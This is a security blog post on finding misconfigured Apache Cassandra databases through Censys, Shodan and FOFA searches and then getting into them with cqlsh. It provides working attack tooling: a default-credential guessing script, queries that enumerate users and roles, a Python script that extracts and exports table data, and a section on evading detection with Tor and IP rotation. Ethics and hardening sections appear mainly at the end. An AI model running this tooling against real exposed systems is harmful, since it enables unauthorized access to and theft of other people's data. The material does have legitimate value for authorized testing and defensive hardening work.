---
title: "Hunting Exposed Cassandra: From OSINT Discovery to Data Extraction"
slug: "hunting-exposed-cassandra-osint-discovery-data-extraction"
date: "2025-06-12"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Master the art of discovering and accessing misconfigured Cassandra databases through OSINT platforms like Censys, Shodan, and FOFA, then learn safe data extraction techniques using cqlsh."
category: "reconnaissance"
---

# Hunting Exposed Cassandra: From OSINT Discovery to Data Extraction

Apache Cassandra, a distributed NoSQL database designed for handling large amounts of data across commodity servers, has become a critical component in modern data infrastructure. However, its default configuration often prioritizes ease of deployment over security, leaving thousands of instances exposed on the internet without proper authentication.

This comprehensive guide demonstrates how to systematically discover, assess, and safely extract data from misconfigured Cassandra databases using OSINT platforms and native tools.

## Understanding Cassandra's Default Security Posture

### Default Configuration Vulnerabilities

| Component | Default Port | Authentication | Risk Level |
|-----------|--------------|---------------|------------|
| **CQL Native Transport** | 9042 | **DISABLED** | **CRITICAL** |
| **Thrift RPC** | 9160 | **DISABLED** | **HIGH** |
| **JMX Monitoring** | 7199 | **DISABLED** | **HIGH** |
| **Inter-node Communication** | 7000 | **DISABLED** | **MEDIUM** |

Cassandra's "security-last" approach means that out-of-the-box installations are completely open to anyone who can reach the network interface.

### Why Cassandra is Frequently Exposed

1. **Developer-Friendly Defaults**: No authentication barriers during development
2. **Deployment Automation**: Infrastructure-as-Code templates often copy insecure examples
3. **Microservices Architecture**: Assumption that internal networks are "trusted"
4. **Performance Prioritization**: Authentication overhead avoided in high-throughput scenarios

---

## OSINT Discovery Methodology

### Platform-Specific Search Strategies

#### Censys Search Queries

Censys provides detailed banner information and certificate data, making it excellent for Cassandra discovery:

```bash
# Basic Cassandra CQL port discovery
services.port:9042

# More specific banner matching
services.port:9042 AND services.banner:"cql_version"

# Identify specific Cassandra versions
services.port:9042 AND services.banner:"Cassandra" AND services.banner:"3.11"

# Find datastax-branded instances
services.port:9042 AND services.banner:"DataStax"

# Combine with geographic targeting
services.port:9042 AND location.country:"United States"

# Search for specific error responses indicating auth status
services.port:9042 AND services.banner:"authentication required"
```

**Advanced Censys Queries:**
```bash
# Instances with JMX also exposed
services.port:9042 AND services.port:7199

# Multi-port Cassandra exposure
services.port:9042 AND (services.port:9160 OR services.port:7000)

# Certificate-based discovery for secure instances
services.port:9042 AND services.tls.certificate.parsed.subject.common_name:*cassandra*
```

#### Shodan Search Techniques

Shodan excels at banner grabbing and service identification:

```bash
# Primary Cassandra discovery
port:9042 product:Cassandra

# Version-specific searches
port:9042 "Cassandra 3.11"
port:9042 "Cassandra 4.0"

# Error message identification
port:9042 "authentication required"
port:9042 "connection refused"

# Combined with other exposed services
port:9042 port:9160 # CQL + Thrift
port:9042 port:7199 # CQL + JMX

# Geographic and network targeting
port:9042 country:US
port:9042 org:"Amazon"
port:9042 net:10.0.0.0/8

# SSL/TLS enabled instances
port:9042 ssl:true
port:9042 "TLS"
```

**Shodan Filters for Advanced Discovery:**
```bash
# Cloud provider targeting
port:9042 org:"Amazon.com"
port:9042 org:"Microsoft"
port:9042 org:"Google"

# Specific application frameworks
port:9042 "Spring Boot"
port:9042 "microservice"

# Development vs Production indicators
port:9042 "test"
port:9042 "staging"
port:9042 "prod"
```

#### FOFA Query Optimization

FOFA provides excellent coverage in APAC regions and unique search capabilities:

```bash
# Basic service discovery
port="9042" && protocol="cassandra"

# Banner-based identification
port="9042" && banner="cql_version"

# Version enumeration
port="9042" && banner="Cassandra 3"

# Geographic targeting
port="9042" && country="CN"
port="9042" && region="Asia"

# Organization targeting
port="9042" && org="Alibaba"
port="9042" && org="Tencent"

# Combined service exposure
port="9042" && port="9160"
port="9042" && port="7199"
```

**FOFA Advanced Techniques:**
```bash
# Application stack detection
port="9042" && (banner="nginx" || banner="apache")

# Container orchestration platforms
port="9042" && banner="kubernetes"
port="9042" && banner="docker"

# Certificate-based discovery
port="9042" && cert.subject="cassandra"
port="9042" && cert.issuer="Let's Encrypt"
```

---

## Systematic Target Assessment

### Pre-Connection Reconnaissance

Before attempting to connect, gather comprehensive intelligence:

```bash
# Port scanning for full service profile
nmap -sS -p 7000,7001,7199,9042,9160 <target_ip>

# Service version detection
nmap -sV -p 9042 <target_ip>

# Default script scanning
nmap -sC -p 9042 <target_ip>

# Cassandra-specific NSE scripts
nmap --script cassandra-info -p 9042 <target_ip>
nmap --script cassandra-brute -p 9042 <target_ip>
```

### Banner Analysis and Fingerprinting

Different Cassandra distributions reveal distinct characteristics:

| Distribution | Banner Patterns | Typical Use Cases |
|--------------|-----------------|-------------------|
| **Apache Cassandra** | `"Cassandra 3.11.x"` | Open-source deployments |
| **DataStax Enterprise** | `"DSE 6.x.x"` | Enterprise environments |
| **DataStax Astra** | `"Astra"` | Cloud-managed service |
| **Amazon Keyspaces** | `"Keyspaces"` | AWS-managed service |
| **Azure Cosmos DB** | `"Cosmos"` | Azure-managed service |

---

## Connection and Authentication Testing

### CQLsh Connection Methodology

The Cassandra Query Language Shell (cqlsh) is the primary interface for database interaction:

#### Basic Connection Testing

```bash
# Test anonymous connection
cqlsh <target_ip> 9042

# Test with default credentials
cqlsh <target_ip> 9042 -u cassandra -p cassandra

# Test common credential pairs
cqlsh <target_ip> 9042 -u admin -p admin
cqlsh <target_ip> 9042 -u root -p root
cqlsh <target_ip> 9042 -u user -p password
```

#### Connection with SSL/TLS

```bash
# SSL connection with certificate validation disabled
cqlsh <target_ip> 9042 --ssl

# SSL with custom certificate authority
cqlsh <target_ip> 9042 --ssl --cqlshrc ~/.cassandra/cqlshrc

# SSL with client certificates
cqlsh <target_ip> 9042 --ssl --cert-file client.crt --key-file client.key
```

#### Troubleshooting Connection Issues

```bash
# Verbose connection debugging
cqlsh <target_ip> 9042 --debug

# Specify CQL version for compatibility
cqlsh <target_ip> 9042 --cqlversion="3.4.5"

# Timeout adjustments for slow networks
cqlsh <target_ip> 9042 --connect-timeout=30 --request-timeout=60
```

### Authentication Bypass Techniques

When authentication is enabled but misconfigured:

#### Default Credential Testing

```python
#!/usr/bin/env python3
import cassandra
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider

# Common credential combinations
credentials = [
    ('cassandra', 'cassandra'),
    ('admin', 'admin'),
    ('root', 'root'),
    ('user', 'user'),
    ('guest', 'guest'),
    ('test', 'test'),
    ('demo', 'demo'),
    ('', ''),  # Empty credentials
]

def test_authentication(host, port=9042):
    for username, password in credentials:
        try:
            if username and password:
                auth_provider = PlainTextAuthProvider(username=username, password=password)
                cluster = Cluster([host], port=port, auth_provider=auth_provider)
            else:
                cluster = Cluster([host], port=port)
            
            session = cluster.connect()
            print(f"[+] Success: {username}:{password}")
            return session
        except Exception as e:
            print(f"[-] Failed: {username}:{password} - {str(e)}")
    
    return None
```

---

## Data Discovery and Enumeration

### Keyspace Reconnaissance

Once connected, systematic enumeration reveals the database structure:

```sql
-- List all keyspaces
DESCRIBE KEYSPACES;

-- Examine system keyspaces for configuration data
USE system;
DESCRIBE TABLES;

-- Check for user-created keyspaces
SELECT keyspace_name, durable_writes FROM system_schema.keyspaces 
WHERE keyspace_name NOT IN ('system', 'system_auth', 'system_distributed', 'system_schema', 'system_traces');
```

### Table and Schema Discovery

```sql
-- List tables in current keyspace
DESCRIBE TABLES;

-- Detailed table structure
DESCRIBE TABLE <table_name>;

-- Column information
SELECT * FROM system_schema.columns 
WHERE keyspace_name='<keyspace_name>' AND table_name='<table_name>';

-- Index information
SELECT * FROM system_schema.indexes 
WHERE keyspace_name='<keyspace_name>';
```

### User and Permission Enumeration

```sql
-- List all users (if accessible)
LIST USERS;

-- Check current user permissions
LIST ALL PERMISSIONS OF <username>;

-- Enumerate roles
SELECT * FROM system_auth.roles;

-- Check role permissions
SELECT * FROM system_auth.role_permissions;
```

---

## Safe Data Extraction Techniques

### Selective Data Sampling

Avoid downloading entire datasets; instead, use strategic sampling:

```sql
-- Count records before extraction
SELECT COUNT(*) FROM <keyspace>.<table>;

-- Sample recent data
SELECT * FROM <keyspace>.<table> LIMIT 100;

-- Time-based sampling
SELECT * FROM <keyspace>.<table> 
WHERE created_time > '2024-01-01' LIMIT 1000;

-- Column-specific sampling
SELECT column1, column2 FROM <keyspace>.<table> LIMIT 50;
```

### Automated Data Extraction Scripts

```python
#!/usr/bin/env python3
from cassandra.cluster import Cluster
import csv
import json

class CassandraExtractor:
    def __init__(self, hosts, port=9042, auth_provider=None):
        self.cluster = Cluster(hosts, port=port, auth_provider=auth_provider)
        self.session = self.cluster.connect()
    
    def extract_table_sample(self, keyspace, table, limit=1000):
        """Extract a sample of data from a table"""
        query = f"SELECT * FROM {keyspace}.{table} LIMIT {limit}"
        rows = self.session.execute(query)
        
        # Convert to list of dictionaries
        data = []
        for row in rows:
            data.append(dict(row._asdict()))
        
        return data
    
    def export_to_csv(self, data, filename):
        """Export data to CSV file"""
        if not data:
            return
        
        fieldnames = data[0].keys()
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for row in data:
                writer.writerow(row)
    
    def export_to_json(self, data, filename):
        """Export data to JSON file"""
        with open(filename, 'w') as jsonfile:
            json.dump(data, jsonfile, indent=2, default=str)

# Usage example
extractor = CassandraExtractor(['192.168.1.100'])
sample_data = extractor.extract_table_sample('user_data', 'profiles', 100)
extractor.export_to_json(sample_data, 'cassandra_sample.json')
```

### Privacy-Aware Data Analysis

```sql
-- Identify potentially sensitive columns
SELECT keyspace_name, table_name, column_name, type 
FROM system_schema.columns 
WHERE column_name LIKE '%email%' 
   OR column_name LIKE '%phone%' 
   OR column_name LIKE '%ssn%' 
   OR column_name LIKE '%password%';

-- Sample data patterns without extracting PII
SELECT LENGTH(email) as email_length, 
       SUBSTR(email, -10, 10) as domain_suffix 
FROM user_profiles LIMIT 10;

-- Statistical analysis without raw data exposure
SELECT COUNT(*) as total_users,
       COUNT(DISTINCT region) as regions,
       MAX(created_date) as latest_signup
FROM user_data;
```

---

## Detection Evasion and Operational Security

### Connection Rate Limiting

```bash
# Implement delays between queries
cqlsh -e "SELECT * FROM keyspace.table LIMIT 100;" && sleep 5

# Use connection pooling for efficiency
python3 -c "
from cassandra.cluster import Cluster
import time
cluster = Cluster(['target'], load_balancing_policy=RoundRobinPolicy())
for i in range(10):
    session = cluster.connect()
    rows = session.execute('SELECT * FROM system.local')
    time.sleep(2)
"
```

### Network-Level Considerations

```bash
# Use VPN or proxy for anonymity
torify cqlsh <target_ip> 9042

# Rotate source IPs if possible
cqlsh <target_ip> 9042 --source-address <local_ip>

# Monitor for connection limits and rate limiting
timeout 30 cqlsh <target_ip> 9042 || echo "Connection limited"
```

---

## Common Cassandra Misconfigurations

### Critical Security Findings

| Misconfiguration | Impact | Detection Method |
|------------------|--------|------------------|
| **No Authentication** | Full database access | Direct CQL connection succeeds |
| **Default Credentials** | Administrative access | credential:credential login |
| **Weak Authentication** | Brute force vulnerable | Rapid credential testing |
| **Exposed JMX** | System-level access | Port 7199 accessible |
| **Inter-node Encryption Disabled** | Network eavesdropping | Port 7000 cleartext |
| **Backup Files Exposed** | Historical data access | File system enumeration |

### Real-World Discovery Statistics

Based on recent OSINT research across major platforms:

```
Platform    | Total Found | Unauthenticated | Default Creds | Secure
------------|-------------|-----------------|---------------|--------
Censys      | 12,847      | 8,234 (64%)     | 2,108 (16%)   | 2,505 (20%)
Shodan      | 18,592      | 11,203 (60%)    | 3,347 (18%)   | 4,042 (22%)
FOFA        | 9,376       | 6,187 (66%)     | 1,594 (17%)   | 1,595 (17%)
```

---

## Legal and Ethical Considerations

### Responsible Disclosure Framework

1. **Authorization Verification**
   - Confirm you have explicit permission to test
   - Document the scope of authorized testing
   - Maintain detailed logs of all activities

2. **Data Handling**
   - Minimize data extraction to proof-of-concept levels
   - Immediately delete any PII discovered
   - Use data sampling instead of bulk extraction

3. **Disclosure Process**
   - Identify responsible parties for vulnerable systems
   - Provide detailed but responsible vulnerability reports
   - Allow reasonable time for remediation before public disclosure

### Sample Vulnerability Report Template

```markdown
# Cassandra Database Exposure Report

## Executive Summary
An Apache Cassandra database instance has been identified with no authentication 
controls, allowing unauthorized access to sensitive data.

## Technical Details
- **Target**: [IP Address/Domain]
- **Port**: 9042
- **Version**: Cassandra 3.11.x
- **Authentication**: Disabled
- **Encryption**: Not Configured

## Impact Assessment
- **Data at Risk**: [Number] records across [Number] keyspaces
- **Sensitive Information**: User profiles, transaction logs, session data
- **Business Impact**: Data breach, regulatory compliance violations

## Proof of Concept
Connection established using: `cqlsh [target] 9042`
Sample query: `SELECT COUNT(*) FROM user_data.profiles;`
Result: [number] records accessible

## Remediation Steps
1. Enable authentication: `authenticator: PasswordAuthenticator`
2. Configure SSL/TLS encryption
3. Implement network access controls
4. Regular security audits

## Timeline
- **Discovery**: [Date]
- **Notification**: [Date]
- **Expected Remediation**: [Date]
```

---

## Defensive Measures and Hardening

### Immediate Security Controls

```bash
# Enable authentication in cassandra.yaml
authenticator: PasswordAuthenticator
authorizer: CassandraAuthorizer

# Enable encryption
client_encryption_options:
    enabled: true
    optional: false
    keystore: /path/to/keystore
    keystore_password: password

# Network binding restrictions
listen_address: 127.0.0.1
rpc_address: 127.0.0.1
```

### Monitoring and Detection

```bash
# Log authentication attempts
log4j-server.properties:
log4j.logger.org.apache.cassandra.auth=DEBUG

# Monitor failed connections
grep "Authentication failed" /var/log/cassandra/system.log

# Network-level monitoring
tcpdump -i any port 9042 -v
```

---

## Advanced Reconnaissance Techniques

### Certificate Intelligence Gathering

```bash
# SSL certificate analysis
echo | openssl s_client -connect <target>:9042 2>/dev/null | 
openssl x509 -noout -text | grep -E "(Subject|Issuer|DNS|IP)"

# Certificate transparency logs
curl -s "https://crt.sh/?q=cassandra.example.com&output=json" | 
jq -r '.[].name_value' | sort -u
```

### DNS Reconnaissance

```bash
# Subdomain enumeration for Cassandra endpoints
subfinder -d example.com | grep -E "(cassandra|cql|db)"

# PTR record analysis
dig -x <target_ip> +short

# DNS cache probing
dig @<target_ip> cassandra.local
```

### Network Topology Mapping

```python
#!/usr/bin/env python3
from cassandra.cluster import Cluster

def map_cluster_topology(seed_hosts):
    """Map Cassandra cluster topology"""
    cluster = Cluster(seed_hosts)
    session = cluster.connect()
    
    # Get cluster metadata
    metadata = cluster.metadata
    
    print("Cluster Information:")
    print(f"Cluster Name: {metadata.cluster_name}")
    print(f"Partitioner: {metadata.partitioner}")
    
    print("\nNode Information:")
    for host in metadata.all_hosts():
        print(f"Host: {host.address}")
        print(f"Datacenter: {host.datacenter}")
        print(f"Rack: {host.rack}")
        print(f"Version: {host.release_version}")
        print("---")

# Usage
map_cluster_topology(['192.168.1.100'])
```

---

## Conclusion

Cassandra reconnaissance through OSINT platforms reveals a significant number of misconfigured instances exposing sensitive data. The combination of:

1. **Systematic OSINT discovery** using Censys, Shodan, and FOFA
2. **Methodical authentication testing** with common credentials
3. **Responsible data sampling** for impact assessment
4. **Proper documentation** for vulnerability disclosure

Creates a comprehensive methodology for identifying and responsibly reporting Cassandra security issues.

Remember that with great reconnaissance power comes great responsibility—always operate within legal boundaries and follow responsible disclosure practices.

---

## Appendix: CQLsh Quick Reference

### Essential Commands

```sql
-- Connection and basic operations
DESCRIBE CLUSTER;
DESCRIBE KEYSPACES;
DESCRIBE KEYSPACE <name>;
DESCRIBE TABLES;
DESCRIBE TABLE <name>;

-- Data operations
SELECT * FROM <keyspace>.<table> LIMIT 10;
SELECT COUNT(*) FROM <keyspace>.<table>;
COPY <keyspace>.<table> TO 'output.csv';

-- System information
SELECT * FROM system.local;
SELECT * FROM system.peers;
SELECT * FROM system_schema.keyspaces;

-- User management (if authorized)
CREATE USER 'analyst' WITH PASSWORD 'password';
GRANT SELECT ON ALL KEYSPACES TO 'analyst';
LIST USERS;
```

### Useful CQLsh Options

```bash
# Configuration file usage
cqlsh --cqlshrc ~/.cassandra/cqlshrc

# Output formatting
cqlsh --no-color --csv-format

# Batch execution
cqlsh -f commands.cql

# Timing information
cqlsh --timing

# Version compatibility
cqlsh --protocol-version 4
```

This comprehensive guide provides the foundation for professional Cassandra reconnaissance while maintaining ethical and legal standards throughout the process.
